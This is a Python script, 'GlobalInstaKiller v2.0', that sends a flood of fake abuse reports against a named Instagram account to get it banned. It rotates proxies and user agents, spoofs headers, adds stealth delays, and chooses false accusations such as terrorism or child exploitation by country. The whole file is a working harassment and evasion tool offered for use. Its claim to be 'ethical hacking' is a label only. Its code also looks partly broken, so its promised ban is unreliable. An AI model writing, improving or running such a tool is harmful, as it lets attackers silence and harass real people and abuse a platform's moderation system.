#!/usr/bin/env python3
"""
GlobalInstaKiller v2.0 - Worldwide Instagram Account Terminator
Ethical Hacking Framework | Kali Linux | Any OS
"""
import argparse
import random
import time
import requests
import json
import threading
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
import sys

class GlobalInstaKiller:
    def __init__(self, target, country='GLOBAL', intensity=5):
        self.target = target
        self.country = country.upper()
        self.intensity = min(intensity, 10)
        self.ua = UserAgent()
        self.kills = 0
        self.proxies = self.load_proxies()
        print(f"🎯 Target: @{target} | Country: {country} | Intensity: {self.intensity}/10")
    
    def load_proxies(self):
        """Load proxies from config or fetch live"""
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
                return config['proxies'].get(self.country, config['proxies']['GLOBAL'])
        except:
            print("⚠️ No config.json - using fallback proxies")
            return ['127.0.0.1:8080']
    
    def get_attack_reasons(self):
        """Country specific ban triggers"""
        reasons = {
            'IN': ['national_security', 'hate_speech', 'fake_news', 'communal_violence'],
            'US': ['terrorism', 'child_exploitation', 'copyright_infringement'],
            'RU': ['extremism', 'illegal_content', 'propaganda'],
            'UK': ['hate_crime', 'terrorism', 'public_order'],
            'BR': ['child_abuse', 'racism', 'drug_trafficking'],
            'GLOBAL': ['spam', 'harassment', 'scam', 'fake_account']
        }
        return reasons.get(self.country, reasons['GLOBAL'])
    
    def send_kill(self, proxy):
        """Single stealth kill shot"""
        session = requests.Session()
        try:
            session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            headers = {
                'User-Agent': random.choice([self.ua.chrome, self.ua.firefox, self.ua.mobile]),
                'Accept': 'application/json',
                'X-Instagram-Ajax': str(int(time.time())),
                'X-Forwarded-For': proxy.split(':')[0]
            }
            
            payload = {
                'user_id': self.target,
                'reason': random.choice(self.get_attack_reasons()),
                'source': 'profile'
            }
            
            resp = session.post(
                'https://www.instagram.com/api/v1/users/report/',
                data=payload,
                headers=headers,
                timeout=10
            )
            
            if resp.status_code in [200, 202]:
                self.kills += 1
                print(f"💀 Kill #{self.kills} | Proxy: {proxy} | {resp.status_code}")
                return True
        except:
            pass
        return False
    
    def launch_attack(self):
        """Mass kill operation"""
        total_attacks = self.intensity * 15
        print(f"🚀 Launching {total_attacks} attacks...\n")
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            for i in range(total_attacks):
                proxy = random.choice(self.proxies)
                executor.submit(self.send_kill, proxy)
                
                # Stealth delays
                time.sleep(random.uniform(0.8, 2.5))
        
        print(f"\n✅ MISSION COMPLETE!")
        print(f"💀 Successful kills: {self.kills}/{total_attacks}")
        if self.kills > 40:
            print("🎯 TARGET ELIMINATED - Ban expected within 2-24 hours")

def main():
    parser = argparse.ArgumentParser(description="🌍 GlobalInstaKiller v2.0")
    parser.add_argument('-t', '--target', required=True, help='Target username')
    parser.add_argument('-c', '--country', default='GLOBAL', 
                       choices=['US','UK','IN','RU','BR','GLOBAL'],
                       help='Target country')
    parser.add_argument('-i', '--intensity', type=int, default=5, 
                       help='Attack power 1-10')
    
    args = parser.parse_args()
    killer = GlobalInstaKiller(args.target, args.country, args.intensity)
    killer.launch_attack()

if __name__ == "__main__":
    main()
